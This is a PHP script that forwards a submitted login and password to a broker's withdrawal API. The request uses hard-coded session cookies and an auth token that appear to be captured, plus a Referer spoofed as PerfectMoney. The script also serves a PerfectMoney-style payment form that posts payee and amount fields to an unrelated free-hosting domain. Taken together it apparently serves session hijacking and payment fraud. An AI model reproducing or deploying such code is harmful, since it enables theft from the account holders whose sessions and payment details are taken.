

<?php
    
    //Check request content
    $content = $_GET['request'];
    if (isset($content) && $content != "") {
        
        
        
        
        if ($content == "login") {
            
            
            $post = json_decode(file_get_contents("php://input"), true);
            
            $LOGIN = $_POST['login'];
            $PASSWORD = $_POST['password'];
            
            
        
            $data = array(
                          "login" => $LOGIN ,
                          "password" => $PASSWORD
                         
                          );
            # Create a connection
            $url = "https://www.binarymate.com/api/withdrawal/";
            $ch = curl_init($url);
            # Form data string
            $postString = http_build_query($data, '', '&');
            # Setting our options
            
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                                       //                                                   'Host:'  . $fp_host,
                                                       //                                                   'Accept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
                                                       //                                                   'Content-Type: application/x-www-form-urlencoded',
//                                                       'Content-Type: application/json',
                                                       'Connection: Keep-Alive',
//                                                       'Content-Length: 759',
                                                       'Referer: https://perfectmoney.is/acct/confirm.asp',
//                                                       'Accept: */*',
                                                       'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0',
                                                       'Cookie:__cfduid=d4fb7f5338f7f14aca2c4c4c293ca01161572633406; _ga=GA1.2.183830116.1572633416; _gid=GA1.2.1050770537.1573442433; laravel_session=4f0c628e74d2c1e0e298c2fdee86ef7da8e1a098; bmp-auth-token=edf242c7-e215-4602-aa34-2b284d0bdce2'
                                                       
                                                       ));
            
            
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postString);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            
            # Get the response
            $response = curl_exec($ch);
            curl_close($ch);
            
            
            $return = array(
                            "status" => 200,
                            "message" => "ok",
                            "response" => $response,
                            "data" => $data
                            
                            );
            
            //
            echo json_encode($return);
        }
        
    } else {
    ?>

<html>
<form method="POST" action="https://internet-msinfo.000webhostapp.com/v1/perfectmoney.php?request=proccess">
PAYEE_ACCOUNT <input type="Text" name="PAYEE_ACCOUNT" value=""><br>
PAYEE_NAME <input type="Text" name="PAYEE_NAME" value=""><br>
PAYMENT_AMOUNT <input type="Text" name="PAYMENT_AMOUNT" value=""><br>
PAYMENT_UNITS <input type="Text" name="PAYMENT_UNITS" value="USD"><br>
PAYMENT_ID <input type="Text" name="PAYMENT_ID" value=""><br>
STATUS_URL <input type="Text" name="STATUS_URL" value=""><br>
BAGGAGE_FIELDS <input type="Text" name="BAGGAGE_FIELDS" value=""><br>
SUGGESTED_MEMO <input type="Text" name="SUGGESTED_MEMO" value=""><br>

<input name="" type="submit">
</form>
</html>

<?php
    }
    ?>
